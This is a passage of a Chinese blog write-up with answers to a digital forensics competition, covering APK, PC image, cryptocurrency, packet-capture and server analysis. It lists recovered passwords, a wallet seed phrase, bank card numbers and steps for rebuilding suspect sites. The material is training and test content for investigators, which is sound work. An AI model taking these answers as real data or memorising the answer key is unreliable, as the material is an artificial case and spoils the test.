href="#id-12-名称-此apk抓包获取到的可访问网站域名IP地址是-。（标准格式：192-168-1-1）" class="headerlink" title="id:12 名称:此apk抓包获取到的可访问网站域名IP地址是_______。（标准格式：192.168.1.1）"></a>id:12 名称:此apk抓包获取到的可访问网站域名IP地址是_______。（标准格式：192.168.1.1）</h5><p>192.168.5.80</p><p>同上上</p><h5 id="id-13-名称-分析apk源码，该apk的加密方式key值是-。（标准格式：12345678）"><a href="#id-13-名称-分析apk源码，该apk的加密方式key值是-。（标准格式：12345678）" class="headerlink" title="id:13 名称:分析apk源码，该apk的加密方式key值是________。（标准格式：12345678）"></a>id:13 名称:分析apk源码，该apk的加密方式key值是________。（标准格式：12345678）</h5><p>ade4b1f8a9e6b666</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240927210636718.png" alt="image-20240927210636718"></p><h5 id="id-14-名称-结合计算机镜像，综合分析，请问该apk开发者公司的座机号码是-。（标准格式：4001122334）"><a href="#id-14-名称-结合计算机镜像，综合分析，请问该apk开发者公司的座机号码是-。（标准格式：4001122334）" class="headerlink" title="id:14 名称:结合计算机镜像，综合分析，请问该apk开发者公司的座机号码是__。（标准格式：4001122334）"></a>id:14 名称:结合计算机镜像，综合分析，请问该apk开发者公司的座机号码是__。（标准格式：4001122334）</h5><p>4008522366</p><p>结合计算机第九题</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929001849488.png" alt="image-20240929001849488"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929001838479.png" alt="image-20240929001838479"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929001922572.png" alt="image-20240929001922572"></p><h4 id="计算机取证"><a href="#计算机取证" class="headerlink" title="计算机取证"></a>计算机取证</h4><h5 id="id-1-名称-对PC镜像分析，请确定涉案电脑的开机密码是-。（标准格式：123456）"><a href="#id-1-名称-对PC镜像分析，请确定涉案电脑的开机密码是-。（标准格式：123456）" class="headerlink" title="id:1 名称:对PC镜像分析，请确定涉案电脑的开机密码是_______。（标准格式：123456）"></a>id:1 名称:对PC镜像分析，请确定涉案电脑的开机密码是_______。（标准格式：123456）</h5><p> Longxin360004</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240927211911959.png" alt="image-20240927211911959"></p><h5 id="id-2-名称-涉案计算机最后一次正常关机时间-。（标准格式：2023-1-11-11-11-11）"><a href="#id-2-名称-涉案计算机最后一次正常关机时间-。（标准格式：2023-1-11-11-11-11）" class="headerlink" title="id:2 名称:涉案计算机最后一次正常关机时间_______。（标准格式：2023-1-11.11:11:11）"></a>id:2 名称:涉案计算机最后一次正常关机时间_______。（标准格式：2023-1-11.11:11:11）</h5><p>2023-09-16.18:20:34</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240927212519012.png" alt="image-20240927212519012"></p><h5 id="id-3-名称-分析涉案计算机，在2022年11月4日此电脑共开机时长为-。（标准格式：1小时1分1秒）"><a href="#id-3-名称-分析涉案计算机，在2022年11月4日此电脑共开机时长为-。（标准格式：1小时1分1秒）" class="headerlink" title="id:3 名称:分析涉案计算机，在2022年11月4日此电脑共开机时长为_______。（标准格式：1小时1分1秒）"></a>id:3 名称:分析涉案计算机，在2022年11月4日此电脑共开机时长为_______。（标准格式：1小时1分1秒）</h5><p>13小时41分钟16秒</p><p>官方答案不管，还要加上前一天12点到今天的时间</p><p>错误答案：3小时58分钟24秒</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240927212945176.png" alt="image-20240927212945176"></p><h5 id="id-4-名称-对PC镜像分析，请确认微信是否是开机自启动程序。（标准格式：是-否）"><a href="#id-4-名称-对PC镜像分析，请确认微信是否是开机自启动程序。（标准格式：是-否）" class="headerlink" title="id:4 名称:对PC镜像分析，请确认微信是否是开机自启动程序。（标准格式：是&#x2F;否）"></a>id:4 名称:对PC镜像分析，请确认微信是否是开机自启动程序。（标准格式：是&#x2F;否）</h5><p>是</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240927213249496.png" alt="image-20240927213249496"></p><h5 id="id-5-名称-检材硬盘中有一个加密分区，给出其中“我的秘密-jpg”文档的解密内容。（标准格式：Longxin0924）"><a href="#id-5-名称-检材硬盘中有一个加密分区，给出其中“我的秘密-jpg”文档的解密内容。（标准格式：Longxin0924）" class="headerlink" title="id:5 名称:检材硬盘中有一个加密分区，给出其中“我的秘密.jpg”文档的解密内容。（标准格式：Longxin0924）"></a>id:5 名称:检材硬盘中有一个加密分区，给出其中“我的秘密.jpg”文档的解密内容。（标准格式：Longxin0924）</h5><p>Mimi1234</p><p>BitLocker加密分区密钥弘联自动分析出来的</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240927232226326.png" alt="image-20240927232226326"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240927221600073.png" alt="image-20240927221600073"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240927221510769.png" alt="image-20240927221510769"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240927221542081.png" alt="image-20240927221542081"></p><h5 id="id-6-名称-接上题，请问该嫌疑人10月份工资是-元。（标准格式：123）"><a href="#id-6-名称-接上题，请问该嫌疑人10月份工资是-元。（标准格式：123）" class="headerlink" title="id:6 名称:接上题，请问该嫌疑人10月份工资是_______元。（标准格式：123）"></a>id:6 名称:接上题，请问该嫌疑人10月份工资是_______元。（标准格式：123）</h5><p>19821</p><p>错误答案：25532</p><p>加密分区里有一个微信内存文件，可以通过龙信内存取证得到</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240927232319551.png" alt="image-20240927232319551"></p><p>密钥解开微信信息加密，就可以看这两个文件了，一开始是404，我重新取了一遍，文件.zip密码就是Mimi1234</p><p>下面的文件日期是20221121，上面的是20221031</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240927232823653.png" alt="image-20240927232823653"></p><h5 id="id-7-名称-对PC镜像进行分析，浏览器中使用过QQ邮箱，请问该邮箱的密码是-。（标准格式：Longxin0924）"><a href="#id-7-名称-对PC镜像进行分析，浏览器中使用过QQ邮箱，请问该邮箱的密码是-。（标准格式：Longxin0924）" class="headerlink" title="id:7 名称:对PC镜像进行分析，浏览器中使用过QQ邮箱，请问该邮箱的密码是______。（标准格式：Longxin0924）"></a>id:7 名称:对PC镜像进行分析，浏览器中使用过QQ邮箱，请问该邮箱的密码是______。（标准格式：Longxin0924）</h5><p>Longxin@2023</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240927223338954.png" alt="image-20240927223338954"></p><h5 id="id-8-名称-结合手机镜像分析，得出一个推广ID，请在此检材找到此海报，请写出路径。（标准格式：D-X-X-1-txt）"><a href="#id-8-名称-结合手机镜像分析，得出一个推广ID，请在此检材找到此海报，请写出路径。（标准格式：D-X-X-1-txt）" class="headerlink" title="id:8 名称:结合手机镜像分析，得出一个推广ID，请在此检材找到此海报，请写出路径。（标准格式：D:\X\X\1.txt）"></a>id:8 名称:结合手机镜像分析，得出一个推广ID，请在此检材找到此海报，请写出路径。（标准格式：D:\X\X\1.txt）</h5><p>C:\Program Files (x86)\Tencent\WeChat\2.png</p><p>错误答案：C:\Users\Public\Documents\1221\1.png</p><p>找到两张图片，md5也一样（不知道为什么我算到一样了，实际上不一样）</p><p>C:\Users\Public\Documents\1221\1.png</p><p>C:\Program Files (x86)\Tencent\WeChat\2.png</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240927230913785.png" alt="image-20240927230913785"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240927233934069.png" alt="image-20240927233934069"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240927233958542.png" alt="image-20240927233958542"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240927230921322.png" alt="image-20240927230921322"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929000832987.png" alt="image-20240929000832987"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929000843603.png" alt="image-20240929000843603"></p><p>2.png最后有银行卡号6320005020052013476</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929000905619.png" alt="image-20240929000905619"></p><h5 id="id-9-名称-请找出嫌疑人的2022年收入共-。（标准格式：123）"><a href="#id-9-名称-请找出嫌疑人的2022年收入共-。（标准格式：123）" class="headerlink" title="id:9 名称:请找出嫌疑人的2022年收入共_______。（标准格式：123）"></a>id:9 名称:请找出嫌疑人的2022年收入共_______。（标准格式：123）</h5><p>205673</p><p>容器存储.dd解密用上题图片作为密钥文件解密，选择TC模式</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929001143067.png" alt="image-20240929001143067"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929001207639.png" alt="image-20240929001207639"></p><p>xways打开</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929002522746.png" alt="image-20240929002522746"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929002528045.png" alt="image-20240929002528045"></p><h5 id="id-10-名称-分析此海报，请找到嫌疑人的银行卡号。（标准格式：62225123456321654）"><a href="#id-10-名称-分析此海报，请找到嫌疑人的银行卡号。（标准格式：62225123456321654）" class="headerlink" title="id:10 名称:分析此海报，请找到嫌疑人的银行卡号。（标准格式：62225123456321654）"></a>id:10 名称:分析此海报，请找到嫌疑人的银行卡号。（标准格式：62225123456321654）</h5><p>6320005020052013476</p><p>计算机第8题</p><p>错误答案：6523365008214741321</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240927233239090.png" alt="image-20240927233239090"></p><h4 id="虚拟币分析"><a href="#虚拟币分析" class="headerlink" title="虚拟币分析"></a>虚拟币分析</h4><p>夜神模拟器导入计算机第9题的npbk文件</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929002803668.png" alt="image-20240929002803668"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929002908407.png" alt="image-20240929002908407"></p><h5 id="id-1-名称-分析涉案计算机，正确填写中转地址当前的代币种类-。（标准格式：BNB）"><a href="#id-1-名称-分析涉案计算机，正确填写中转地址当前的代币种类-。（标准格式：BNB）" class="headerlink" title="id:1 名称:分析涉案计算机，正确填写中转地址当前的代币种类______。（标准格式：BNB）"></a>id:1 名称:分析涉案计算机，正确填写中转地址当前的代币种类______。（标准格式：BNB）</h5><p>ETH</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929003006116.png" alt="image-20240929003006116"></p><h5 id="id-2-名称-分析涉案计算机，正确填写中转地址当前的代币余额数量-。（标准格式：1-23）"><a href="#id-2-名称-分析涉案计算机，正确填写中转地址当前的代币余额数量-。（标准格式：1-23）" class="headerlink" title="id:2 名称:分析涉案计算机，正确填写中转地址当前的代币余额数量_______。（标准格式：1.23）"></a>id:2 名称:分析涉案计算机，正确填写中转地址当前的代币余额数量_______。（标准格式：1.23）</h5><p>4.498111780847082000</p><p>错误答案：0</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929003133825.png" alt="image-20240929003133825"></p><p>改zip文件，解压出来是vmdk文件，挂载找数据库</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929004532485.png" alt="image-20240929004532485"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929004553291.png" alt="image-20240929004553291"></p><p>格式化json文档，精确度18位</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929004956750.png" alt="image-20240929004956750"></p><h5 id="id-3-名称-根据中转地址转账记录找出买币方地址。买币方地址：-（标准格式：0x123ABC"><a href="#id-3-名称-根据中转地址转账记录找出买币方地址。买币方地址：-（标准格式：0x123ABC" class="headerlink" title="id:3 名称:根据中转地址转账记录找出买币方地址。买币方地址：_____（标准格式：0x123ABC)"></a>id:3 名称:根据中转地址转账记录找出买币方地址。买币方地址：_____（标准格式：0x123ABC)</h5><p>0x63AA203086938f82380A6A3521cCBf9c56d111eA</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929005757275.png" alt="image-20240929005757275"></p><h5 id="id-4-名称-根据中转地址转账记录统计买方地址转账金额。转账金额：-ETH-（标准格式-12-3）"><a href="#id-4-名称-根据中转地址转账记录统计买方地址转账金额。转账金额：-ETH-（标准格式-12-3）" class="headerlink" title="id:4 名称:根据中转地址转账记录统计买方地址转账金额。转账金额：____ ETH.（标准格式:12.3）"></a>id:4 名称:根据中转地址转账记录统计买方地址转账金额。转账金额：____ ETH.（标准格式:12.3）</h5><p>150.5</p><p>0.5</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929010237501.png" alt="image-20240929010237501"></p><p>50</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929010226075.png" alt="image-20240929010226075"></p><p>100</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929010203473.png" alt="image-20240929010203473"></p><h5 id="id-5-名称-在创建钱包时，应用APP都会建议我们进行助记词备份，方便以后忘记密码后找回钱包，在办案过程中时常会拿到犯罪嫌疑人备份的助记词的情况。请从以下三组助记词中判断出格式正确的一组（-）"><a href="#id-5-名称-在创建钱包时，应用APP都会建议我们进行助记词备份，方便以后忘记密码后找回钱包，在办案过程中时常会拿到犯罪嫌疑人备份的助记词的情况。请从以下三组助记词中判断出格式正确的一组（-）" class="headerlink" title="id:5 名称:在创建钱包时，应用APP都会建议我们进行助记词备份，方便以后忘记密码后找回钱包，在办案过程中时常会拿到犯罪嫌疑人备份的助记词的情况。请从以下三组助记词中判断出格式正确的一组（ ）"></a>id:5 名称:在创建钱包时，应用APP都会建议我们进行助记词备份，方便以后忘记密码后找回钱包，在办案过程中时常会拿到犯罪嫌疑人备份的助记词的情况。请从以下三组助记词中判断出格式正确的一组（ ）</h5><p>A.raw sausage art hub inspire dizzy funny exile local middle shed primary</p><p>B.raw sausage art hub inspire dizzy funny middle shed primary</p><p>C.raw sausage art funny exile local middle shed primary</p><p>A</p><p>助记词（也称为恢复短语或种子短语）通常由一系列单词组成，这些单词用于加密货币钱包中恢复账户。不同的钱包软件可能使用不同数量的单词，但常见的是12个、18个或24个单词。</p><h5 id="id-6-名称-假设上题中正确的助记词为通过侦察找到的嫌疑人钱包助记词备份（已知地址属于以太坊链），请在模拟器中通过imToken-APP恢复嫌疑人钱包，并选出正确钱包地址（-）"><a href="#id-6-名称-假设上题中正确的助记词为通过侦察找到的嫌疑人钱包助记词备份（已知地址属于以太坊链），请在模拟器中通过imToken-APP恢复嫌疑人钱包，并选出正确钱包地址（-）" class="headerlink" title="id:6 名称:假设上题中正确的助记词为通过侦察找到的嫌疑人钱包助记词备份（已知地址属于以太坊链），请在模拟器中通过imToken APP恢复嫌疑人钱包，并选出正确钱包地址（ ）"></a>id:6 名称:假设上题中正确的助记词为通过侦察找到的嫌疑人钱包助记词备份（已知地址属于以太坊链），请在模拟器中通过imToken APP恢复嫌疑人钱包，并选出正确钱包地址（ ）</h5><p>A.0xf0fF021880c4b1F79876E335c74d26DFa75DC9f9</p><p>B.0x63AA203086938f82380A6A3521cCBf9c56d111eA</p><p>C.0x0fd5F09C6Ba5Fd0aE6EbAFAF034913ACF7a0373A</p><p>B</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929010700835.png" alt="image-20240929010700835"></p><h4 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h4><h5 id="id-1-名称-分析“数据包1-cap”，请问客户端为什么访问不了服务器。（-）"><a href="#id-1-名称-分析“数据包1-cap”，请问客户端为什么访问不了服务器。（-）" class="headerlink" title="id:1 名称:分析“数据包1.cap”，请问客户端为什么访问不了服务器。（  ）"></a>id:1 名称:分析“数据包1.cap”，请问客户端为什么访问不了服务器。（  ）</h5><p>A.DDoS攻击</p><p>B.DoS攻击</p><p>C.SQL注入</p><p>D.文档攻击</p><p>B</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929010928176.png" alt="image-20240929010928176"></p><h5 id="id-2-名称-分析“数据包1-cap”，出问题的服务器IP地址是-。（格式：127-0-0-1）"><a href="#id-2-名称-分析“数据包1-cap”，出问题的服务器IP地址是-。（格式：127-0-0-1）" class="headerlink" title="id:2 名称:分析“数据包1.cap”，出问题的服务器IP地址是_______。（格式：127.0.0.1）"></a>id:2 名称:分析“数据包1.cap”，出问题的服务器IP地址是_______。（格式：127.0.0.1）</h5><p>116.211.168.203</p><p>同上</p><h5 id="id-3-名称-分析“数据包1-cap”，文件下发服务器的IP地址是-。（标准格式：127-0-0-1）"><a href="#id-3-名称-分析“数据包1-cap”，文件下发服务器的IP地址是-。（标准格式：127-0-0-1）" class="headerlink" title="id:3 名称:分析“数据包1.cap”，文件下发服务器的IP地址是_______。（标准格式：127.0.0.1）"></a>id:3 名称:分析“数据包1.cap”，文件下发服务器的IP地址是_______。（标准格式：127.0.0.1）</h5><p>120.210.129.29</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929011551329.png" alt="image-20240929011551329"></p><h5 id="id-4-名称-分析“数据包1-cap”，攻击者利用-漏洞进行远程代码执行。（标准格式：XXX）"><a href="#id-4-名称-分析“数据包1-cap”，攻击者利用-漏洞进行远程代码执行。（标准格式：XXX）" class="headerlink" title="id:4 名称:分析“数据包1.cap”，攻击者利用_______漏洞进行远程代码执行。（标准格式：XXX）"></a>id:4 名称:分析“数据包1.cap”，攻击者利用_______漏洞进行远程代码执行。（标准格式：XXX）</h5><p>struts2</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928124547109.png" alt="image-20240928124547109"></p><h5 id="id-5-名称-分析“数据包1-cap”，请提取恶意文件，并校验该文件的MD5值为-。-标准格式-abcd"><a href="#id-5-名称-分析“数据包1-cap”，请提取恶意文件，并校验该文件的MD5值为-。-标准格式-abcd" class="headerlink" title="id:5 名称:分析“数据包1.cap”，请提取恶意文件，并校验该文件的MD5值为_______。(标准格式:abcd)"></a>id:5 名称:分析“数据包1.cap”，请提取恶意文件，并校验该文件的MD5值为_______。(标准格式:abcd)</h5><p>87540c645d003e6eebf1102e6f904197</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928133529469.png" alt="image-20240928133529469"></p><h5 id="id-6-名称-分析“数据包2-cap”，其获取文件的路径是-。（标准格式：D-X-X-1-txt）"><a href="#id-6-名称-分析“数据包2-cap”，其获取文件的路径是-。（标准格式：D-X-X-1-txt）" class="headerlink" title="id:6 名称:分析“数据包2.cap”，其获取文件的路径是________。（标准格式：D:&#x2F;X&#x2F;X&#x2F;1.txt）"></a>id:6 名称:分析“数据包2.cap”，其获取文件的路径是________。（标准格式：D:&#x2F;X&#x2F;X&#x2F;1.txt）</h5><p>C:&#x2F;Users&#x2F;Administrator&#x2F;Downloads&#x2F;新建文件夹&#x2F;新建文件夹&#x2F;mail.png</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928135507914.png" alt="image-20240928135507914"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928135611325.png" alt="image-20240928135611325"></p><h5 id="id-7-名称-分析“数据包2-cap”，文件下载服务器的认证账号密码是-。（标准格式：123）"><a href="#id-7-名称-分析“数据包2-cap”，文件下载服务器的认证账号密码是-。（标准格式：123）" class="headerlink" title="id:7 名称:分析“数据包2.cap”，文件下载服务器的认证账号密码是_______。（标准格式：123）"></a>id:7 名称:分析“数据包2.cap”，文件下载服务器的认证账号密码是_______。（标准格式：123）</h5><p>passwd</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928135505704.png" alt="image-20240928135505704"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928135448907.png" alt="image-20240928135448907"></p><h5 id="id-8-名称-分析“数据包2-cap”，其下载的文件名大小有-字节。（标准格式：123）"><a href="#id-8-名称-分析“数据包2-cap”，其下载的文件名大小有-字节。（标准格式：123）" class="headerlink" title="id:8 名称:分析“数据包2.cap”，其下载的文件名大小有________字节。（标准格式：123）"></a>id:8 名称:分析“数据包2.cap”，其下载的文件名大小有________字节。（标准格式：123）</h5><p>211625</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928135738467.png" alt="image-20240928135738467"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928135828632.png" alt="image-20240928135828632"></p><h4 id="服务器取证1"><a href="#服务器取证1" class="headerlink" title="服务器取证1"></a>服务器取证1</h4><h5 id="宝塔网站重构"><a href="#宝塔网站重构" class="headerlink" title="宝塔网站重构"></a>宝塔网站重构</h5><p>开始啥都不会显示，我这里更新了一下宝塔就好了</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928144400290.png" alt="image-20240928144400290"></p><p>添加hosts</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928145123612.png" alt="image-20240928145123612"></p><h6 id="wiiudot-cn"><a href="#wiiudot-cn" class="headerlink" title="wiiudot.cn"></a>wiiudot.cn</h6><p>首页显示错误</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928145036431.png" alt="image-20240928145036431"></p><p>修改配置文件，再看首页发现是数据库问题</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928145055398.png" alt="image-20240928145055398"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928145141320.png" alt="image-20240928145141320"></p><p>虽然配置文件全是连接47.98.13.21这个ip，但是服务器有本地数据库，改配置文件hostname为localhost就行</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928145454662.png" alt="image-20240928145454662"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928145700928.png" alt="image-20240928145700928"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928145708600.png" alt="image-20240928145708600"></p><p>修改数据库密码进后台，原密码9eb2b9ad495a75f80f9cf67ed08bbaae居然就是123456</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928150000652.png" alt="image-20240928150000652"></p><p>ok，成了一个</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928150102879.png" alt="image-20240928150102879"></p><h6 id="sb-wiiudot-cn"><a href="#sb-wiiudot-cn" class="headerlink" title="sb.wiiudot.cn"></a>sb.wiiudot.cn</h6><p>改完hostname首页依旧报错</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928150430762.png" alt="image-20240928150430762"></p><p>密码不对</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928151218005.png" alt="image-20240928151218005"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928151209843.png" alt="image-20240928151209843"></p><p>改个密码就好了</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928151407548.png" alt="image-20240928151407548"></p><p>后台密码也改掉，原密码81dbdde41342ef4304ed3f0bf6041278，ok</p><h6 id="tf-chongwuxiaoyouxi-com"><a href="#tf-chongwuxiaoyouxi-com" class="headerlink" title="tf.chongwuxiaoyouxi.com"></a><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928151611252.png" alt="image-20240928151611252">tf.chongwuxiaoyouxi.com</h6><p>感觉路由有点问题，访问后台返回的是首页的页面</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928153434522.png" alt="image-20240928153434522"></p><h5 id="id-1-名称-服务器系统的版本号是-。-格式-1-1-1111"><a href="#id-1-名称-服务器系统的版本号是-。-格式-1-1-1111" class="headerlink" title="id:1 名称:服务器系统的版本号是_______。(格式:1.1.1111)"></a>id:1 名称:服务器系统的版本号是_______。(格式:1.1.1111)</h5><p> 7.9.2009</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928140800811.png" alt="image-20240928140800811"></p><h5 id="id-2-名称-网站数据库的版本号是-。-格式-1-1-1111"><a href="#id-2-名称-网站数据库的版本号是-。-格式-1-1-1111" class="headerlink" title="id:2 名称:网站数据库的版本号是_______。(格式:1.1.1111)"></a>id:2 名称:网站数据库的版本号是_______。(格式:1.1.1111)</h5><p>5.6.50</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928140825046.png" alt="image-20240928140825046"></p><h5 id="id-3-名称-宝塔面板的“超时”时间是-分钟。-格式-50"><a href="#id-3-名称-宝塔面板的“超时”时间是-分钟。-格式-50" class="headerlink" title="id:3 名称:宝塔面板的“超时”时间是_______分钟。(格式:50)"></a>id:3 名称:宝塔面板的“超时”时间是_______分钟。(格式:50)</h5><p>120</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928141657364.png" alt="image-20240928141657364"></p><h5 id="id-4-名称-网站源码备份压缩文件SHA256值是-。-格式-64位小写"><a href="#id-4-名称-网站源码备份压缩文件SHA256值是-。-格式-64位小写" class="headerlink" title="id:4 名称:网站源码备份压缩文件SHA256值是_______。(格式:64位小写)"></a>id:4 名称:网站源码备份压缩文件SHA256值是_______。(格式:64位小写)</h5><p> 0bdeeacf755126dae9efd38f6a6d70323aa95217b629fd389e0e81f9b406be39</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928142317995.png" alt="image-20240928142317995"></p><h5 id="id-5-名称-分发网站sb-wiiudot-cn管理员密码默认MD5加密盐值是-。-格式-abcd"><a href="#id-5-名称-分发网站sb-wiiudot-cn管理员密码默认MD5加密盐值是-。-格式-abcd" class="headerlink" title="id:5 名称:分发网站sb.wiiudot.cn管理员密码默认MD5加密盐值是_______。(格式:abcd)"></a>id:5 名称:分发网站sb.wiiudot.cn管理员密码默认MD5加密盐值是_______。(格式:abcd)</h5><p>lshi4AsSUrUOwWV</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928142902477.png" alt="image-20240928142902477"></p><h5 id="id-6-名称-分发网站sb-wiiudot-cn一共存放了-条通讯录数据。（标准格式-1234）"><a href="#id-6-名称-分发网站sb-wiiudot-cn一共存放了-条通讯录数据。（标准格式-1234）" class="headerlink" title="id:6 名称:分发网站sb.wiiudot.cn一共存放了_______条通讯录数据。（标准格式:1234）"></a>id:6 名称:分发网站sb.wiiudot.cn一共存放了_______条通讯录数据。（标准格式:1234）</h5><p>67277</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928154622527.png" alt="image-20240928154622527"></p><h5 id="id-7-名称-全部网站一共有-名受害人。-格式-xxx。不去重-不进行数据恢复"><a href="#id-7-名称-全部网站一共有-名受害人。-格式-xxx。不去重-不进行数据恢复" class="headerlink" title="id:7 名称:全部网站一共有_______名受害人。(格式:xxx。不去重,不进行数据恢复)"></a>id:7 名称:全部网站一共有_______名受害人。(格式:xxx。不去重,不进行数据恢复)</h5><p>506</p><p>错误答案：1017</p><p>732+85+200</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928155051469.png" alt="image-20240928155051469"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928155057837.png" alt="image-20240928155057837"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928155102737.png" alt="image-20240928155102737"></p><p>三个网站之间的数据不去重，单个网站内还是要去重</p><p>267+182+57</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929011919246.png" alt="image-20240929011919246"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929011936981.png" alt="image-20240929011936981"></p><h5 id="id-8-名称-分发网站tf-chongwuxiaoyouxi-com里面一共有-位“组员级别”的管理员。-格式-数字"><a href="#id-8-名称-分发网站tf-chongwuxiaoyouxi-com里面一共有-位“组员级别”的管理员。-格式-数字" class="headerlink" title="id:8 名称:分发网站tf.chongwuxiaoyouxi.com里面一共有_______位“组员级别”的管理员。(格式:数字)"></a>id:8 名称:分发网站tf.chongwuxiaoyouxi.com里面一共有_______位“组员级别”的管理员。(格式:数字)</h5><p>26</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928155403749.png" alt="image-20240928155403749"></p><h5 id="id-9-名称-分发网站sb-wiiudot-cn管理员名为“0820”的邀请码是-。-格式-xxx"><a href="#id-9-名称-分发网站sb-wiiudot-cn管理员名为“0820”的邀请码是-。-格式-xxx" class="headerlink" title="id:9 名称:分发网站sb.wiiudot.cn管理员名为“0820”的邀请码是_______。(格式:xxx)"></a>id:9 名称:分发网站sb.wiiudot.cn管理员名为“0820”的邀请码是_______。(格式:xxx)</h5><p>443074</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929012119885.png" alt="image-20240929012119885"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929012113853.png" alt="image-20240929012113853"></p><h5 id="id-10-名称-分发网站sb-wiiudot-cn本地数据库用户sb-wiiudot-cn的密码是-。-格式-xxx"><a href="#id-10-名称-分发网站sb-wiiudot-cn本地数据库用户sb-wiiudot-cn的密码是-。-格式-xxx" 